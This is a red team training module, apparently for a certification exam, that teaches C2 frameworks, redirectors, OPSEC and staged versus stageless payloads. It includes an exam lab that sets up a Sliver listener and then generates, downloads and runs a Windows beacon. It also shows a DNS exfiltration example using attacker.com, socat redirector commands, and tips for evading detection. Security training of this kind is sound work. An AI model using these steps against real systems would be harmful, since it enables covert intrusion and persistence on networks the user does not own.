# Phase 01: Red Team Infrastructure & OPSEC

> **Why this phase exists**: Your C2 server is your lifeline during the exam. If defenders can find it, kill it, or your beacon can't reach it, you have nothing. Infrastructure is the foundation everything else runs on. OPSEC — operational security — is about not getting caught.

**Study time**: 1 week
**Difficulty**: Beginner–Intermediate

---

## Learning Objectives

- [ ] Explain what a C2 framework is and why red teams use one instead of raw shells
- [ ] Explain what a redirector is and why it exists
- [ ] Explain what OPSEC means in the context of red teaming
- [ ] Understand the difference between staging and stageless payloads
- [ ] Set up a basic C2 listener and receive a callback from a Windows target
- [ ] Explain why traffic profiling matters and how C2 profiles customize it

---

## 1. What is a C2 Framework and Why Use One?

### The problem with raw shells

Imagine you exploit a machine and get a raw netcat reverse shell. You have a terminal. But:
- If the connection drops, you lose the shell — permanently
- You can't easily run multiple tools or inject code into other processes
- There's no session management — one operator, one host at a time
- Traffic is obvious (raw TCP streams look nothing like normal traffic)
- No encryption — anyone watching the wire sees everything

### What a C2 framework solves

A **Command and Control (C2) framework** is a platform for managing compromised hosts (called **agents**, **implants**, or **beacons**) from a central server. It provides:

- **Persistent sessions**: if the beacon loses connection, it reconnects automatically
- **Multiple protocols**: HTTP/S, DNS, SMB — looks like normal traffic
- **Task queuing**: send tasks even when the beacon is sleeping
- **Post-exploitation modules**: run Mimikatz, SharpHound, etc. in memory without dropping files
- **Multi-operator support**: a team can share access to all beacons
- **Encryption**: all traffic encrypted between beacon and server

### The architecture

```
[Compromised host]                [Your server]
  Beacon process          ←→      C2 Server
  (your implant)          ←→      (Sliver / Havoc / CS)
       |                                |
   checks in every                operator's
   N seconds (sleep)               terminal
```

The beacon "phones home" on a schedule (sleep interval). Between check-ins, it's idle and hard to detect. When the operator sends a task, the beacon picks it up on next check-in, executes it, and sends results back.

**Sleep interval** is a key OPSEC control — a 5-second sleep generates 12 network connections per minute (noisy). A 60-second sleep is much quieter. During the exam, balance between speed and stealth.

---

## 2. C2 Communication Channels

### HTTP/HTTPS (most common)

The beacon makes outbound HTTP/S requests to your server — exactly like a browser loading a webpage. Network defenders see HTTPS traffic to an IP or domain and can't read it (encrypted). This is why HTTPS C2 is the default.

**What defenders look for**:
- Regular, periodic connections (the sleep interval is a giveaway — a real browser doesn't load the same page every 30 seconds)
- Unusual destinations (your attacker IP/domain has no reputation)
- Abnormal User-Agent strings or HTTP headers

**How C2 profiles solve this**: A C2 profile customizes the HTTP traffic to look like a specific application — a browser loading a CDN, an antivirus calling home, a Windows update check. This is called **traffic blending**.

### DNS C2 (for egress filtering environments)

If outbound HTTP is blocked but DNS is allowed (almost always is), you can exfiltrate data in DNS queries:
```
beacon queries: a1b2c3.attacker.com → A record
next task encoded in: 4d5e6f.attacker.com → A record
```
Very slow but can bypass strict egress filtering. Unlikely in the CRTeamer exam but good to understand.

### SMB C2 (for internal pivoting)

SMB C2 uses Windows named pipes instead of network sockets. The beacon talks to another beacon which relays to the server. Used when a compromised host has no internet access but can talk to another host that does.

```
[Internal host, no internet]  →(SMB pipe)→  [Pivot host, has internet]  →(HTTPS)→  [C2 server]
```

---

## 3. Redirectors — Why They Exist

A **redirector** sits between the victim and your C2 server. If blue team investigators follow the beacon's traffic, they find the redirector — not your real server.

```
[victim]  →→→  [redirector: cheap VPS]  →→→  [C2 server: your real box]
```

Benefits:
- Real C2 server IP is never exposed to the victim network
- If the redirector gets burned (IP blocked, seized), spin up a new one — real server unchanged
- Can apply filtering: only relay valid C2 traffic, return 404 for everything else (looks like a broken site)

### How to set up a simple redirector

```bash
# On a cheap VPS (DigitalOcean $4/month droplet):
# Method 1: socat (simplest)
sudo apt install socat
sudo socat TCP-LISTEN:443,fork TCP:<REAL_C2_IP>:443

# Method 2: Apache mod_rewrite (with filtering)
# Only relay requests that look like your C2 traffic; block everything else
# This way a researcher visiting your redirector IP just gets a 404
```

**For the exam**: You're on a VPN in the same network as the targets. A redirector is unnecessary for the exam itself. But understanding why it exists is important for the interview/consulting context.

---

## 4. OPSEC — Operational Security

OPSEC in red teaming means leaving the minimum possible evidence of your presence. Three questions to ask before every action:

**1. Does this action generate a log?**
- Creating a process: Event 4688
- Writing a file: Sysmon Event 11
- Network connection: Sysmon Event 3 / NetFlow
- Opening LSASS: Sysmon Event 10

**2. Does this log stand out?**
- A process named `beacon.exe` run from `C:\Windows\Temp` → stands out
- `rundll32.exe` run from `C:\Windows\System32` → normal
- HTTPS traffic to a brand-new domain → stands out
- HTTPS traffic to a CDN-looking domain → normal

**3. Can I achieve my objective with lower footprint?**
- Instead of dropping a binary: inject shellcode into an existing process
- Instead of writing to disk: execute in memory
- Instead of using a known tool name: rename it or use the C2's execute-assembly

### OPSEC tiers (use throughout your learning)

| Tier | Examples | Exam risk |
|------|---------|-----------|
| 🟢 Low | LDAP queries, reading files, passive enum | Very low |
| 🟡 Medium | Kerberoasting, BloodHound collection, WinRM | Low–Medium |
| 🔴 High | LSASS dump, DCSync, PsExec, password spray | Medium–High |
| 💀 Loud | Skeleton key, mass coercion, service creation | High — avoid if possible |

---

## 5. Staging vs Stageless Payloads

### Staged payloads

A small **stager** is delivered to the victim. The stager connects back to your server and downloads the full payload (the stage) in memory. Two-step process:

```
Victim runs stager (tiny, ~5KB) 
→ stager connects to C2
→ C2 sends full beacon (~500KB) in memory
→ full beacon runs
```

**Pros**: Small initial file — easier to deliver, less to detect statically.
**Cons**: Requires the victim to reach your server to get the stage. Extra network connection.

### Stageless payloads

The complete beacon is embedded in the delivered file. One step:

```
Victim runs beacon.exe (full beacon, ~500KB-5MB)
→ beacon runs directly
```

**Pros**: Works even if the victim can't reach the internet directly after initial execution. More reliable.
**Cons**: Larger file = more surface area for static AV detection.

**For the exam**: Use stageless. Simpler, more reliable, and you're already on the same VPN segment as the target.

---

## 6. Hands-On: Your First C2 Setup

### Lab exercise — complete this before moving on

**Goal**: Set up Sliver, create a listener, generate a stageless beacon, get a callback from a Windows VM.

**Step 1: Install Sliver on Kali**
```bash
# Download latest release
curl https://sliver.sh/install | sudo bash
# Or manually:
wget https://github.com/BishopFox/sliver/releases/latest/download/sliver-server_linux
chmod +x sliver-server_linux && sudo mv sliver-server_linux /usr/local/bin/sliver-server
```

**Step 2: Start the server**
```bash
sudo sliver-server
# First run generates certificates and config — takes ~30 seconds
```

**Step 3: Create an HTTPS listener**
```
sliver > https --lhost 0.0.0.0 --lport 443
```

**Step 4: Generate a stageless beacon**
```
sliver > generate --http https://<your_kali_ip> --os windows --arch amd64 \
  --format exe --save /tmp/beacon.exe
```

**Step 5: Transfer to Windows VM and execute**
```bash
# Host a simple HTTP server on Kali
python3 -m http.server 8080
# On Windows VM (PowerShell):
iwr http://<kali_ip>:8080/beacon.exe -o C:\Windows\Temp\beacon.exe
C:\Windows\Temp\beacon.exe
```

**Step 6: Receive the callback**
```
sliver > sessions
# Should show your new session
sliver > use <session_id>
sliver (session) > info
sliver (session) > getuid
```

**What went wrong if you got no callback?**
- Firewall blocking port 443 on Kali → `sudo ufw allow 443`
- Windows Defender caught the beacon → read Phase 04 for bypass
- Wrong IP in the beacon → regenerate with correct IP

---

## 7. Practice Labs for This Phase

| Lab | Platform | Cost | Focus |
|-----|---------|------|-------|
| [THM: Intro to C2](https://tryhackme.com/room/introtoc2) | TryHackMe | Free | C2 concepts guided |
| [THM: Red Team Fundamentals](https://tryhackme.com/room/redteamfundamentals) | TryHackMe | Free | Red team concepts, OPSEC |
| [THM: Red Team OPSEC](https://tryhackme.com/room/opsec) | TryHackMe | Free | OPSEC deep dive |
| Manual: Sliver setup drill | Your lab | Free | Do the exercise above 3 times until it's automatic |

---

## Phase 01 Mastery Checklist

- [ ] Can you explain what a C2 framework does and why a raw shell isn't enough?
- [ ] Can you explain the difference between staged and stageless payloads?
- [ ] Can you explain what a redirector is and why it protects the real C2?
- [ ] Can you explain what sleep interval means and why it matters for OPSEC?
- [ ] Can you set up Sliver, create a listener, and get a Windows callback in under 20 minutes from scratch?
- [ ] Can you explain what a C2 profile is and what it changes about your traffic?
- [ ] Can you name at least 3 things that generate Windows event logs and which events they produce?

---

## Next Phase

→ **Phase 02: C2 Frameworks Deep Dive** — going beyond basic setup to profiles, pivoting, and in-memory execution
